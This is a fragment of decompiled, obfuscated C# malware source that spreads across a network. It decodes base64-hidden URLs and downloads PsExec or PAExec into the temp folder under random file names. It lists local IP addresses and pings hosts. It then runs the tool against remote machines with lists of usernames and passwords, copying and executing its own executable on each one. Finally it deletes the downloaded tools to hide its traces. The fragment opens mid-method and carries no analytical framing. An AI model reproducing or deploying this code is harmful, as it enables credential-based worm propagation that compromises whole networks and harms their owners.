									eqCksjvMyn.xQfMOPCvvVAqwp(iuErTVcwZsUKt, "\\\\" + ip + " -u \"" + tHplFUdWgAiy[i] + "\" -p \"" + MlDcbZBYTSGl[i] + "\" -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
								}
							}
							else if (File.Exists(jrpSqdXwQKGgHX))
							{
								eqCksjvMyn.xQfMOPCvvVAqwp(jrpSqdXwQKGgHX, "\\\\" + ip + " -u \"" + tHplFUdWgAiy[i] + "\" -p \"" + MlDcbZBYTSGl[i] + "\" -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
							}
						}
					}
					else if (eqCksjvMyn.TpOjlZaYAqM)
					{
						if (File.Exists(iuErTVcwZsUKt))
						{
							eqCksjvMyn.xQfMOPCvvVAqwp(iuErTVcwZsUKt, "\\\\" + ip + " -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
						}
					}
					else if (File.Exists(jrpSqdXwQKGgHX))
					{
						eqCksjvMyn.xQfMOPCvvVAqwp(jrpSqdXwQKGgHX, "\\\\" + ip + " -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
					}
				}
			});
		}
		catch
		{
			return;
		}
		try
		{
			if (File.Exists(iuErTVcwZsUKt))
			{
				File.Delete(iuErTVcwZsUKt);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(jrpSqdXwQKGgHX))
			{
				File.Delete(jrpSqdXwQKGgHX);
			}
		}
		catch (Exception)
		{
		}
	}

	public static List<string> JOGCMQXOiYn()
	{
		List<string> list = new List<string>();
		IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
		IPAddress[] addressList = hostEntry.AddressList;
		foreach (IPAddress iPAddress in addressList)
		{
			if (iPAddress.AddressFamily.ToString() == "InterNetwork")
			{
				list.Add(iPAddress.ToString());
			}
		}
		return list;
	}

	public static string xHrYTWEEyyxfwH()
	{
		if (IntPtr.Size == 8)
		{
			return eHMYXOdxaKCc(new Uri(eqCksjvMyn.joRKfFeYni("aHR0cHM6Ly93d3cucG93ZXJhZG1pbi5jb20vcGFleGVjL3BhZXhlYy5leGU=")));
		}
		return eHMYXOdxaKCc(new Uri(eqCksjvMyn.joRKfFeYni("aHR0cHM6Ly93d3cucG93ZXJhZG1pbi5jb20vcGFleGVjL3BhZXhlYy5leGU=")));
	}

	public static string fmSPTcryiMwTjv()
	{
		if (IntPtr.Size == 8)
		{
			return eHMYXOdxaKCc(new Uri(eqCksjvMyn.joRKfFeYni("aHR0cDovL2xpdmUuc3lzaW50ZXJuYWxzLmNvbS9Qc0V4ZWM2NC5leGU=")));
		}
		return eHMYXOdxaKCc(new Uri(eqCksjvMyn.joRKfFeYni("aHR0cDovL2xpdmUuc3lzaW50ZXJuYWxzLmNvbS9Qc0V4ZWMuZXhl")));
	}

	public static bool bXTLOcmBneaTm(string skKDbXRkgFMOf)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(skKDbXRkgFMOf);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string eHMYXOdxaKCc(Uri DDnXSRcuYiMGif)
	{
		string path = Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe";
		WebClient webClient = new WebClient();
		webClient.DownloadFile(DDnXSRcuYiMGif, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	public static List<string> MiZOrJurKPQc()
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		string[] array = null;
		try
		{
			ArrayList arrayList = new ArrayList();
			ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM Win32_NetworkAdapterConfiguration ");
			ManagementObjectCollection val2 = val.Get();
			ManagementObjectEnumerator enumerator = val2.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					if ((bool)((ManagementBaseObject)val3).get_Item("IpEnabled"))
					{
						string[] array2 = (string[])((ManagementBaseObject)val3).get_Item("IPAddress");
						string[] array3 = array2;
						foreach (string value in array3)
						{
							arrayList.Add(value);
						}
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (arrayList.Count > 0)
			{
				array = new string[arrayList.Count];
				arrayList.CopyTo(array);
			}
			else
			{
				array = new string[0];
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (array == null)
			{
				return null;
			}
			string[] array3 = array;
			foreach (string RsEsRvvzseGl in array3)
			{
				if (RsEsRvvzseGl.Contains(":"))
				{
					array = array.Where((string o) => o != RsEsRvvzseGl).ToArray();
				}
			}
			return array.ToList();
		}
		catch
		{
			return null;
		}
	}
}
